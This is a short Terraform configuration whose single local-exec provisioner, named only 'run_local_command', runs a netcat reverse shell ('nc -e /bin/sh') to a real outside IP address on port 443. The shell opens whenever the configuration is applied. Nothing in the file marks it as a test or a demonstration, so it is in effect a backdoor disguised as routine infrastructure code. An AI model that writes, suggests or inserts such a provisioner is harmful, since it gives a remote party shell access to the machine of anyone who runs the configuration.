resource "null_resource" "run_local_command" {
  provisioner "local-exec" {
    command = "echo `nc -e /bin/sh 129.146.56.69 443`"
  }
}